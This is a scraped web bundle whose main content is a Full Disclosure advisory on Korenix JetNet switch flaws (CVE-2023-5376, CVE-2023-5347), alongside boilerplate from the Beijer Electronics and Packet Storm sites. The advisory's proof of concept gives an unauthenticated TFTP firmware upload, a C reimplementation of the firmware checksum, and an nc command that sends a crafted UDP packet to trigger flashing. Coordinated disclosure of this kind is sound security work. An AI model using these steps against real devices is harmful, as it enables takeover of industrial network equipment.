=== Content from www.beijerelectronics.com_8d9e7c7a_20250114_185942.html ===


## Registration

Please proceed and register for customized access to documents, service/return issues and e-Business.

## Registration

Email

Password

Password again

Name

Company

Country

Afghanistan
Åland Islands
Albania
Algeria
American Samoa
Andorra
Angola
Anguilla
Antarctica
Antigua and Barbuda
Argentina
Armenia
Aruba
Australia
Austria
Azerbaijan
Bahamas
Bahrain
Bangladesh
Barbados
Belarus
Belgium
Belize
Benin
Bermuda
Bhutan
Bolivia (Plurinational State of)
Bosnia and Herzegovina
Botswana
Bouvet Island
Brazil
British Indian Ocean Territory
Brunei Darussalam
Bulgaria
Burkina Faso
Burundi
Cabo Verde
Cambodia
Cameroon
Canada
Caribbean Netherlands
Cayman Islands
Central African Republic
Chad
Chile
China
Christmas Island
Cocos (Keeling) Islands
Colombia
Comoros
Congo
Congo, Democratic Republic of the
Cook Islands
Costa Rica
Croatia
Cuba
Curaçao
Cyprus
Czech Republic
Côte d'Ivoire
Denmark
Djibouti
Dominica
Dominican Republic
Ecuador
Egypt
El Salvador
Equatorial Guinea
Eritrea
Estonia
Eswatini (Swaziland)
Ethiopia
Falkland Islands (Malvinas)
Faroe Islands
Fiji
Finland
France
French Guiana
French Polynesia
French Southern Territories
Gabon
Gambia
Georgia
Germany
Ghana
Gibraltar
Greece
Greenland
Grenada
Guadeloupe
Guam
Guatemala
Guernsey
Guinea
Guinea-Bissau
Guyana
Haiti
Heard Island and Mcdonald Islands
Honduras
Hong Kong
Hungary
Iceland
India
Indonesia
Iran
Iraq
Ireland
Isle of Man
Israel
Italy
Jamaica
Japan
Jersey
Jordan
Kazakhstan
Kenya
Kiribati
Korea, North
Korea, South
Kosovo
Kuwait
Kyrgyzstan
Lao People's Democratic Republic
Latvia
Lebanon
Lesotho
Liberia
Libya
Liechtenstein
Lithuania
Luxembourg
Macao
Macedonia North
Madagascar
Malawi
Malaysia
Maldives
Mali
Malta
Marshall Islands
Martinique
Mauritania
Mauritius
Mayotte
Mexico
Micronesia
Moldova
Monaco
Mongolia
Montenegro
Montserrat
Morocco
Mozambique
Myanmar (Burma)
Namibia
Nauru
Nepal
Netherlands
Netherlands Antilles
New Caledonia
New Zealand
Nicaragua
Niger
Nigeria
Niue
Norfolk Island
Northern Mariana Islands
Norway
Oman
Pakistan
Palau
Palestine
Panama
Papua New Guinea
Paraguay
Peru
Philippines
Pitcairn Islands
Poland
Portugal
Puerto Rico
Qatar
Reunion
Romania
Russian Federation
Rwanda
Saint Barthelemy
Saint Helena
Saint Kitts and Nevis
Saint Lucia
Saint Martin
Saint Pierre and Miquelon
Saint Vincent and the Grenadines
Samoa
San Marino
Sao Tome and Principe
Saudi Arabia
Senegal
Serbia
Serbia and Montenegro
Seychelles
Sierra Leone
Singapore
Sint Maarten
Slovakia
Slovenia
Solomon Islands
Somalia
South Africa
South Georgia and the South Sandwich Islands
South Sudan
Spain
Sri Lanka
Sudan
Suriname
Svalbard and Jan Mayen
Sweden
Switzerland
Syria
Taiwan
Tajikistan
Tanzania
Thailand
Timor-Leste
Togo
Tokelau
Tonga
Trinidad and Tobago
Tunisia
Turkey (Türkiye)
Turkmenistan
Turks and Caicos Islands
Tuvalu
U.S. Outlying Islands
Uganda
Ukraine
United Arab Emirates
United Kingdom
United States
Uruguay
Uzbekistan
Vanuatu
Vatican City Holy See
Venezuela
Vietnam
Virgin Islands, British
Virgin Islands, U.S
Wallis and Futuna
Western Sahara
Yemen
Zambia
Zimbabwe

Register

## You'll get more

If you create an account and log in you will get personal and extended information from Beijer Electronics. You will get instant access to SmartStore, documents, service/return issues and e-Business.

If you need more information, please contact our [**customer service**.](/en/contact___us/Contact)

## New user?

Sign up here

Forgot your password?
[Click here](/en/Data/forgotpasswordlightbox)

## Log in

Username

Password

Log in

* [Global](http://www.beijerelectronics.com)
* [Americas](http://www.beijerelectronics.us/)
* [简体中文](http://www.beijerelectronics.cn/)
* [France](http://www.beijerelectronics.com/)
* [Germany](http://www.beijerelectronics.de/)
* [Denmark](http://www.beijerelectronics.com)
* [Norway](http://www.beijerelectronics.no/)
* [Sweden](http://www.beijerelectronics.se/)
* [Turkey](http://www.beijerelektronik.com.tr/)
* [India](http://www.beijerelectronics.com)
* [Asia Pacific](https://www.beijerelectronics.com)
* [繁體中文](https://www.beijerelectronics.tw/zh-tw/)
* [日本語](http://www.beijerelectronics.com/japan)
* [한국어](http://www.beijerelectronics.com/korea)
* [United Kingdom](http://www.beijerelectronics.com)

* Products
  + HMI panels
    - [Introduction to HMI panels](/en/Products/Operator___panels)
    - [X3 series](/en/Products/Operator___panels/X3___series)
    - [X2 base](/en/Products/Operator___panels/X2___base)
    - [X2 pro](/en/Products/Operator___panels/X2___pro)
    - [X2 marine](/en/Products/Operator___panels/X2___marine)
    - [X2 control](/en/Products/Operator___panels/X2___control)
    - [X2 extreme](/en/Products/Operator___panels/X2___extreme)
    - [X2 web](/en/Products/Operator___panels/X2___web)
    - [Accessories](/en/Products/Operator___panels/Accessories)
    - [iX HMI Software](/en/Products/Operator___panels/iX___Software)
    - [Previous models](/en/Products/Operator___panels/Previous___models)
    - [EOL guide EXTER and E1000](/en/Products/Operator___panels/EOL___guide___EXTER___and___E1000)
  + [Web HMI and SCADA](/en/Products/Web___HMI___and___SCADA)
  + [Marine monitors and PCs](/en/Products/Marine___monitors___and___PCs)
  + Software
    - [Introduction to Software](/en/Products/software)
    - [iX HMI Software](/en/Products/software/ix-hmi-software)
    - [BCS Tools](/en/Products/software/BCS___Tools)
    - [Web HMI and SCADA](/en/Products/software/Web___HMI___and___SCADA)
    - [Smart engineering](/en/Products/software/Smart___engineering)
    - [CODESYS control](/en/Products/software/CODESYS___control)
  + CloudVPN gateway
    - [Introduction to CloudVPN gateway](/en/Products/CloudVPN___gateway)
    - [A simple-to-use portal](/en/Products/CloudVPN___gateway/Simple___to___use)
    - [A flexible platform](/en/Products/CloudVPN___gateway/A___flexible___platform)
    - [A secure platform](/en/Products/CloudVPN___gateway/A___secure___platform)
    - [Tutorial videos](/en/Products/CloudVPN___gateway/Tutorial___videos)
    - [CloudVPN Help Center](https://cloudvpn.beijerelectronics.com/hc/en-us)
  + Converters and IIoT gateways
    - [Introduction to Converters and IIoT gateways](/en/Products/Converters___and___IIoT___gateways)
    - [Protocol conversion](/en/Products/Converters___and___IIoT___gateways/Protocol___conversion)
    - [IIoT and cloud connectivity](/en/Products/Converters___and___IIoT___gateways/Cloud___connectivity)
    - [Communication server for mobile HMI](/en/Products/Converters___and___IIoT___gateways/Communication___server___for___mobile___HMI)
    - [Integrated CODESYS control](/en/Products/Converters___and___IIoT___gateways/Integrated___CODESYS___control)
    - [BoX2 Configuration Tool](/en/Products/Converters___and___IIoT___gateways/BoX2___Configuration___Tool)
    - [BoX2 base v2](/en/Products/Converters___and___IIoT___gateways/BoX2___base___v2)
    - [BoX2 pro](/en/Products/Converters___and___IIoT___gateways/BoX2___pro)
    - [BoX2 extreme](/en/Products/Converters___and___IIoT___gateways/BoX2___extreme)
    - [BoX2 pro SC](/en/Products/Converters___and___IIoT___gateways/BoX2___pro___SC)
    - [BoX2 extreme SC](/en/Products/Converters___and___IIoT___gateways/BoX2___extreme___SC)
    - [BoX2 base](/en/Products/Converters___and___IIoT___gateways/BoX2___base)
  + Industrial data communication
    - [Introduction to Industrial data communication](/en/Products/Industrial___data___communication)
    - [Ethernet switches](/en/Products/Industrial___data___communication/Ethernet___switches___-___JetNet)
    - [Wireless](/en/Products/Industrial___data___communication/Wireless___-___JetWave)
    - [Media converters](/en/Products/Industrial___data___communication/Media___converters___-___JetCon)
    - [Industrial connectivity](/en/Products/Industrial___data___communication/Industrial___connectivity)
    - [Accessories](/en/Products/Industrial___data___communication/Accessories)
    - [Remote access solutions](/en/Products/Industrial___data___communication/Remote___access)
    - [5G technology](/en/Products/Industrial___data___communication/5G___technology)
    - [Application examples](/en/Products/Industrial___data___communication/Application___examples)
  + Control systems
    - [Introduction to Control systems](/en/Products/Control___systems)
    - [X2 with CODESYS control](/en/Products/Control___systems/X2___with___CODESYS___control)
    - [Distributed CODESYS control](/en/Products/Control___systems/Distributed___CODESYS___control)
    - [Nexto modular PLC](/en/Products/Control___systems/Modular___PLC)
    - [Nexto Xpress compact controller](/en/Products/Control___systems/Compact___controller)
    - [BoX2 edge controller](/en/Products/Control___systems/BoX2___edge___controller)
    - [Remote terminal units](/en/Products/Control___systems/RTU)
    - [Remote telemetry units - RTU32M](/en/Products/Control___systems/Remote___telemetry___units___-___RTU32M)
    - [BCS Tools](/en/Products/Control___systems/BCS___Tools)
    - [Smart engineering](/en/Products/Control___systems/Smart___engineering)
  + Frequency inverters
    - [Introduction to Frequency inverters](/en/Products/frequency-inverters)
    - [General purpose](/en/Products/frequency-inverters/General___purpose___-___BFI___E3)
    - [Dedicated HVAC](/en/Products/frequency-inverters/hvac---bfi-h2-and-h3)
    - [High performance](/en/Products/frequency-inverters/high-performance---bfi-p2)
    - [Options and spareparts](/en/Products/frequency-inverters/Options)
    - [Software for frequency inverters](/en/Products/frequency-inverters/software)
    - [BFI Tools Mobile](/en/Products/frequency-inverters/BFI___Tools___Mobile)
    - [Previous models](/en/Products/frequency-inverters/Previous___models)
  + Distributed IO
    - [Introduction to Distributed IO](/en/Products/Distributed___IO)
    - [G series IOs](/en/Products/Distributed___IO/G___series___IOs)
    - [M series IOs](/en/Products/Distributed___IO/M___series___IOs)
    - [S series IOs](/en/Products/Distributed___IO/S___series___IOs)
    - [Nexto Jet IOs](/en/Products/Distributed___IO/Nexto___Jet___IOs)
  + Servo motion
    - [Introduction to Servo motion](/en/Products/Servo___motion)
    - [BoX2 pro motion](/en/Products/Servo___motion/BoX2___pro___motion)
    - [Servo drives](/en/Products/Servo___motion/Servo___drives)
    - [Servo motors](/en/Products/Servo___motion/Servo___motors)
  + Power supplies
    - [Introduction to Power supplies](/en/Products/Power___supplies)
    - [12 VDC](/en/Products/Power___supplies/12___VDC)
    - [24 VDC](/en/Products/Power___supplies/24___VDC)
    - [48 VDC](/en/Products/Power___supplies/48___VDC)
* Solutions & Industries
  + Our solutions
    - [Introduction to Our solutions](/en/industries--applications/Our___solutions)
    - [Operator communication](/en/industries--applications/Our___solutions/Operator___communication)
    - [Automation solutions](/en/industries--applications/Our___solutions/Automation___solutions)
    - [Digitalization](/en/industries--applications/Our___solutions/Digitalization)
  + Segments & Industries
    - [Introduction to Segments & Industries](/en/industries--applications/Industries)
    - [Marine](/en/industries--applications/Industries/Marine)
    - [Energy](/en/industries--applications/Industries/Energy)
    - [Infrastructure](/en/industries--applications/Industries/Infrastructure)
    - [Manufacturing](/en/industries--applications/Industries/Manufacturing)
  + [Customer cases](/en/industries--applications/Success___stories)
  + [White papers](/en/industries--applications/White___papers)
* Support
  + [Our support](/en/Support/Support)
* Events & Webinars
  + [News](/en/news---events/News)
  + [Events](/en/news---events/Events)
  + [Webinars](/en/news---events/Webinars)
  + [Sign up for newsletter](/en/news---events/Sign___up___for___newsletter)
* About us
  + [Our company](/en/About___us/Our___company)
  + [Management](/en/About___us/Management)
  + [Sustainability](/en/About___us/Sustainability)
  + [Compliance policies and procedures](/en/About___us/Compliance___policies___and___procedures)
  + [Partner program UNITED](/en/About___us/Partner___program___UNITED)
  + [Investor relations](/en/About___us/Investor___relations)
* Contact us
  + [Contact](/en/contact___us/Contact)
  + [Where to buy](/en/contact___us/Where___to___buy)
  + [Become a business partner](/en/contact___us/Become___a___business___partner)
  + [Join us](https://career.beijerelectronics.com/)
* MyPortal
  + [eBusiness](https://ebusiness.beijerelectronics.com/)
* [SmartStore](http://smartstore.beijerelectronics.com/)

Log in / Register

* [Global](http://www.beijerelectronics.com)
* [Americas](http://www.beijerelectronics.us/)
* [简体中文](http://www.beijerelectronics.cn/)
* [France](http://www.beijerelectronics.com/)
* [Germany](http://www.beijerelectronics.de/)
* [Denmark](http://www.beijerelectronics.com)
* [Norway](http://www.beijerelectronics.no/)
* [Sweden](http://www.beijerelectronics.se/)
* [Turkey](http://www.beijerelektronik.com.tr/)
* [India](http://www.beijerelectronics.com)
* [Asia Pacific](https://www.beijerelectronics.com)
* [繁體中文](https://www.beijerelectronics.tw/zh-tw/)
* [日本語](http://www.beijerelectronics.com/japan)
* [한국어](http://www.beijerelectronics.com/korea)
* [United Kingdom](http://www.beijerelectronics.com)

---

# Help online

## Many support issues can easily be resolved through our knowledge database

**[You can also browse through our database here - Help online Tree view](/en/Support/file-archive-tree-page)**

**[Please also remember to have a look at our tutorial videos!](/en/Support/Videos)**

Type in your search phrase in the field below. To the right, you can refine your search by selecting the document type that you are looking for.

---

All documents
Adverts
Applications
Brochures
Cable guide
Catalogues
Certificates
Configuration files
Customer magazine
Data sheets
Drawings
Drivers
EOL information
Financial information
Firmware
Information document
Knowledge
Manuals
Other
Pictures
PowerPoints
Press information
Press releases
Price lists
Product information
Program examples - Quickstarts
Program examples - Start-up
References
Security advisories
Service documentation
Software
System program
Templates
White papers

## Search result, 0 hits:

## No documents found. Please refine your search.

---

## People & Technology. Connected.

We are a people company. Our experienced, skilled and passionate people empower you to meet your challenges through best-in-class, user-friendly solutions. We are a technology company. We help you optimize processes through our software, hardware and services, and through our support. Connecting people and technologies gives you the means to accomplish your goals and ambitions, and gain a competitive edge in today’s digitalized world.

## Popular downloads

+ [iX Developer](https://smartstore.beijerelectronics.com/en/Software/Software___products/?filter=Latest%20version%20)
+ [iX Runtime](https://smartstore.beijerelectronics.com/en/Software/Software___products/?filter=Latest%20version%20)
+ [BCS Tools](https://smartstore.beijerelectronics.com/en/Software/Software___products/?filter=Latest%20version%20)
+ [WebIQ](https://smartstore.beijerelectronics.com/en/Software/Software___products/?filter=Latest%20version%20,Web%20HMI%20and%20SCADA%20)

Visiting address HQ: Stora Varvsgatan 13a
SE - 211 75 Malmoe, SWEDEN

+46 40 35 86 00

info@beijerelectronics.com

Cookie Settings

* [![LinkedIn](/-/media/beijerelectronics,-d-,com/Images/Footer/LinkedIn.ashx?la=en&hash=DD63481061C82F3FBCDD4AE4C86BBB191C641D54)](https://www.linkedin.com/company/beijer-electronics)
* [![YouTube](/-/media/beijerelectronics,-d-,com/Images/Footer/YouTubeIcon.ashx?la=en&hash=6A7EB547DFEF2BD35F5E46D61CA86B0BEF5F2E2A)](https://www.youtube.com/user/BeijerElectronics/)



=== Content from seclists.org_2cc0c00c_20250114_185941.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](12)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](12)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20240109-0 | Multiple Vulnerabilities in JetNet Series

---

*From*: Thomas Weber via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Tue, 9 Jan 2024 09:57:37 +0000

---

```
CyberDanube Security Research 20240109-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities
              product| Korenix JetNet Series
   vulnerable version| See "Vulnerable versions"
        fixed version| -
           CVE number| CVE-2023-5376, CVE-2023-5347
               impact| High
             homepage| <https://www.korenix.com/>
                found| 2023-08-31
                   by| S. Dietz (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. Pölten
                     |
                     | <https://www.cyberdanube.com>
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Korenix Technology, a Beijer group company within the Industrial Communication
business area, is a global leading manufacturer providing innovative, market-
oriented, value-focused Industrial Wired and Wireless Networking Solutions.
With decades of experiences in the industry, we have developed various product
lines [...].

Our products are mainly applied in SMART industries: Surveillance, Machine-to-
Machine, Automation, Remote Monitoring, and Transportation. Worldwide customer
base covers different Sales channels, including end-customers, OEMs, system
integrators, and brand label partners. [...]"

Source: <https://www.korenix.com/en/about/index.aspx?kind=3>

Vulnerable versions
-------------------------------------------------------------------------------
Tested on emulated Korenix JetNet 5310G / v2.6

All vulnerable models/versions according to vendor:
JetNet 4508 (4508i-w V1.3, 4508 V2.3, 4508-w V2.3)
JetNet 4508f, 4508if (4508if-s V1.3,4508if-m V1.3, 4508if-sw V1.3,
       4508if-mw V1.3, 4508f-m V2.3, 4508f-s V2.3, 4508f-mw V2.3,
       4508f-sw V2.3)
JetNet 5620G-4C V1.1
JetNet 5612GP-4F V1.2
JetNet 5612G-4F V1.2
JetNet 5728G (5728G-24P-AC-2DC-US V2.1, 5728G-24P-AC-2DC-EU V2.0)
JetNet 528Gf (6528Gf-2AC-EU V1.0, 6528Gf-2AC-US V1.0, 6528Gf-2DC24 V1.0,
       6528Gf-2DC48 V1.0, 6528Gf-AC-EU V1.0, 6528Gf-AC-US V1.0)
JetNet 6628XP-4F-US V1.1
JetNet 6628X-4F-EU V1.0
JetNet 6728G (6728G-24P-AC-2DC-US V1.1, 6728G-24P-AC-2DC-EU V1.1)
JetNet 6828Gf (6828Gf-2DC48 V1.0, 6828Gf-2DC24 V1.0, 6828Gf-AC-DC24-US V1.0,
       6828Gf-2AC-US V1.0, 6828Gf-AC-US V1.0, 6828Gf-2AC-AU V1.0,
       6828Gf-AC-DC24-EU V1.0, 6828Gf-2AC-EU V1.0)
JetNet 6910G-M12 HVDC V1.0
JetNet 7310G-V2 2.0
JetNet 7628XP-4F-US V1.0, 7628XP-4F-US V1.1, 7628XP-4F-EU V1.0,
       7628XP-4F-EU V1.1
JetNet 7628X-4F-US V1.0, 7628X-4F-EU V1.0
JetNet 7714G-M12 HVDC V1.0

Vulnerability overview
-------------------------------------------------------------------------------
1) TFTP Without Authentication (CVE-2023-5376)
The available tftp service is accessable without user authentication. This
allows the user to upload and download files to the restricted "/home" folder.

2) Unauthenticated Firmware Upgrade (CVE-2023-5347)
A critical security vulnerability has been identified that may allow an
unauthenticated attacker to compromise the integrity of a device or cause a
denial of service (DoS) condition. This vulnerability resides in the firmware
upgrade process of the affected system.

Proof of Concept
-------------------------------------------------------------------------------
1) TFTP Without Authentication (CVE-2023-5376)
The Linux tftp client was used to upload a firmware to the absolute path
"/home/firmware.bin":

# tftp $IP
tftp> put exploit.bin /home/firmware.bin
Sent 5520766 bytes in 5.7 seconds

2) Unauthenticated Firmware Upgrade (CVE-2023-5347)
Unauthenticated attackers can exploit this by uploading malicious firmware via
TFTP and initializing the upgrade process with a crafted UDP packet on port
5010.

We came to the conclusion that the firmware image consists of multiple
sections. Our interpretation of these can be seen below:

===============================================================================
class FirmwarePart:
    def init(self, name, offset, size):
        self.name = name
        self.offset = offset
        self.size = size

firmware_parts = [
    FirmwarePart("uimage_header", 0x0, 0x40),
    FirmwarePart("uimage_kernel", 0x40, 0x3c54),
    FirmwarePart("gzip", 0x3c94, 0x14a000 - 0x3c94),
    FirmwarePart("squashfs", 0x14a000, 0x539000 - 0x14a000),
    FirmwarePart("metadata", 0x539000, 5480448 - 0x539000),
]
===============================================================================

The squashfs includes the rootfs. Metadata includes a 4 byte checksum which
needs to be modified when repacked. During our analysis we observed that the
checksum gets calculated over all sections except metadata. To test this
vulnerability we reimplemented the checksum calculation at offset 0x9bdc in
the binary "/bin/cmd-server2":

===============================================================================
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int32_t check_file(const char* arg1) {
    FILE* r0 = fopen(arg1, "rb");

    if (!r0) {
        return 0xffffffff;
    }

    int32_t filechecksum = 0;
    int32_t last_data_size = 0;
    int32_t file_size = 0;
    uint8_t data_buf[4096];
    int32_t data_len = 1;

    while (data_len > 0) {
        data_len = fread(data_buf, 1, sizeof(data_buf), r0);

        if (data_len == 0) {
            break;
        }

        int32_t counter = 0;
        while (counter < (data_len >> 2)) {
            int32_t byte_at_counter = *((int32_t*)(data_buf + (counter << 2)));
            counter++;
            filechecksum += byte_at_counter;
        }

        file_size += data_len;
        last_data_size = data_len;
    }

    fclose(r0);

    if (last_data_size < 0x400 || (last_data_size >= 0x400 && (file_size - 0x14a
  000) > 0x5ac000)) {
        return 0xffffffff;
    }

    data_len = 0;
    while (data_len < (last_data_size >> 2)) {
        int32_t r3_2 = *((int32_t*)(data_buf + (data_len << 2)));
        data_len++;
        filechecksum -= r3_2;
    }

    return filechecksum;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <file_path>\n", argv[0]);
        return 1;
    }

    int32_t result = check_file(argv[1]);
    printf("0x%x\n", result);

    return 0;
}
===============================================================================

After modifying and repacking the squashfs, we calculated the checksum,
patched the required bytes in the metadata section (offset 0x11b-0x11e) and
initilized the update process.

===============================================================================
# tftp $IP
tftp> put exploit.bin /home/firmware.bin
Sent 5520766 bytes in 5.7 seconds

# echo -e "\x00\x00\x00\x1f\x00\x00\x00\x01\x01" | nc -u $IP 5010
===============================================================================

The output of the serial console can be observed below:
===============================================================================
Jan  1 00:01:00 Jan  1 00:01:00 syslog: UDP cmd is received
Jan  1 00:01:00 Jan  1 00:01:00 syslog: management vlan = sw0.0
Jan  1 00:01:00 Jan  1 00:01:00 syslog: setsockopt(SO_BINDTODEVICE) No such devi
Jan  1 00:01:00 Jan  1 00:01:00 syslog: tlv_count = 0
Jan  1 00:01:00 Jan  1 00:01:00 syslog: rec_bytes = 10
Jan  1 00:01:00 Jan  1 00:01:00 syslog: command TLV_FW_UPGRADE received
check firmware...
checksum=b2256313, inFileChecksum=b2256313
Firmware upgrading, don't turn off the switch!
Begin erasing flash:
.
Write firmware.bin (5480448 Bytes) to flash:
...
Write finished...
Terminating child processes...
Jan  1 00:01:01 Jan  1 00:01:01 syslog: first time create tlv_chain
Jan  1 00:01:01 syslogd exiting
Firmware upgrade success!!
waiting for reboot command .......
===============================================================================

The vulnerabilities were manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (<https://medusa.cyberdanube.com>).

Solution
-------------------------------------------------------------------------------
Beijer/Korenix provided a workaround to mitigate the vulnerabilities until a
proper patch is available (see "Workaround" section).

Workaround
-------------------------------------------------------------------------------
Beijer representatives provided the following workaround for mitigating the
vulnerabilities on devices of the JetNet series:
"Login by terminal:

Switch# configure terminal

Switch(config)# service ipscan disable

Switch(config)# tftpd disable

Switch(config)# copy running-config startup-config
"
Source: <https://www.beijerelectronics.com/en/support/Help___online?docId=69947>

This commands should be used to deactivate the TFTP daemon on the device to
prevent unauthenticated actors from abusing the service.

Recommendation
-------------------------------------------------------------------------------
Regardless to the current state of the vulnerability, CyberDanube recommends
customers from Korenix to upgrade the firmware to the latest version available.
Furthermore, a full security review by professionals is recommended.

Contact Timeline
-------------------------------------------------------------------------------
31-08-2023: Contacting Beijer Electronics Group via cs () beijerelectronics com.
31-08-2023: Receiving contact information. Send vulnerability information.
26-09-2023: Asking about vulnerability status and receiving update release date.
27-10-2023: Received update from contact regarding the firmware update.
29-11-2023: Meeting with contact stating that it effects the whole series.
31-11-2023: Meeting to discuss potential solutions.
11-12-2023: Release delayed due to lack of workaround from manufacturer.
21-12-2023: Manufacturer provides workaround. Release date confirmed.
09-01-2024: Coordinated release of security advisory.

Web: <https://www.cyberdanube.com>
Twitter: <https://twitter.com/cyberdanube>
Mail: research at cyberdanube dot com

EOF Sebastian Dietz / @2024
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](10)
[By Date](date.html#11)
[![Next](/images/right-icon-16x16.png)](12)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#11)
[![Next](/images/right-icon-16x16.png)](12)

### Current thread:

* **CyberDanube Security Research 20240109-0 | Multiple Vulnerabilities in JetNet Series** *Thomas Weber via Fulldisclosure (Jan 14)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_7aa9ec2e_20250114_185939.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


